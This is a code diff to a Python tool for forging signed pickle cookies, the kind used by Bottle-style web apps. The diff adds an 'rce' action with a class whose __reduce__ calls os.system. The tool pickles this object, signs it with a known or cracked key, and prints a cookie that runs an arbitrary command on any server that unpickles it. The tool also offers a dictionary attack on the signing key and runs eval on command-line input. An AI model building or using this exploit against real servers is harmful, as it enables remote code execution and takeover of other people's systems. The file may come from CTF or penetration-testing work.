@@ -10,6 +10,13 @@ from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeEl
 
 console = Console()
 
+class RCE:
+    def __init__(self, cmd):
+        self.cmd = cmd
+
+    def __reduce__(self):
+        return (os.system, (self.cmd,))
+
 class CookieEncoderDecoder:
     def __init__(self, key=None):
         self.key = key
@@ -44,6 +51,14 @@ class CookieEncoderDecoder:
     def encode(self, data):
         ''' Encode and sign a pickle-able object. Return a (byte) string '''
         msg = base64.b64encode(pickle.dumps(data, -1))
+        sig = base64.b64encode(hmac.new(self.tob(self.key), msg, digestmod=hashlib.md5).digest())
+        return self.tob('!') + sig + self.tob('?') + msg
+
+    def encode_rce(self, cmd):
+        ''' Encode and sign a custom pickled object (RCE). Return a (byte) string '''
+        rce_instance = RCE(cmd)
+        data = ("name", {"name": rce_instance})
+        msg = base64.b64encode(pickle.dumps(data, protocol=pickle.HIGHEST_PROTOCOL))
         sig = base64.b64encode(hmac.new(self.tob(self.key), msg, digestmod=hashlib.md5).digest())
         return self.tob('!') + sig + self.tob('?') + msg
 
@@ -84,15 +99,16 @@ class CookieEncoderDecoder:
 
 def main():
     parser = argparse.ArgumentParser(description='Encode or decode cookies.')
-    parser.add_argument('action', choices=['encode', 'decode', 'dict-attack'], help='Action to perform: encode, decode, or dict-attack')
+    parser.add_argument('action', choices=['encode', 'decode', 'dict-attack', 'rce'], help='Action to perform: encode, decode, dict-attack, or rce')
     parser.add_argument('--cookie', required=True, help='The cookie to encode or decode')
-    parser.add_argument('--key', help='The secret key for encoding or decoding')
+    parser.add_argument('--key', help='The secret key for encoding, decoding, or custom encoding')
     parser.add_argument('--wordlist', help='Path to the wordlist for dictionary attack')
+    parser.add_argument('--cmd', help='System command to execute for RCE encoding (required for rce action)')
 
     args = parser.parse_args()
 
-    if args.action in ['encode', 'decode'] and not args.key:
-        parser.error('--key is required for encode and decode actions')
+    if args.action in ['encode', 'decode', 'rce'] and not args.key:
+        parser.error('--key is required for encode, decode, and rce actions')
 
     encoder_decoder = CookieEncoderDecoder(args.key)
 
@@ -108,6 +124,11 @@ def main():
         data = eval(args.cookie)
         encoded_cookie = encoder_decoder.encode(data)
         console.print(f"[bold][blue]Encoded cookie:[/blue] [green]{encoded_cookie.decode()}[/green][/bold]")
+    elif args.action == 'rce':
+        if not args.cmd:
+            parser.error('--cmd is required for rce action')
+        encoded_cookie = encoder_decoder.encode_rce(args.cmd)
+        console.print(f"[bold][blue]Encoded cookie with custom object (RCE):[/blue] [green]{encoded_cookie.decode()}[/green][/bold]")
     elif args.action == 'dict-attack':
         if not args.wordlist:
             parser.error('--wordlist is required for dict-attack action')
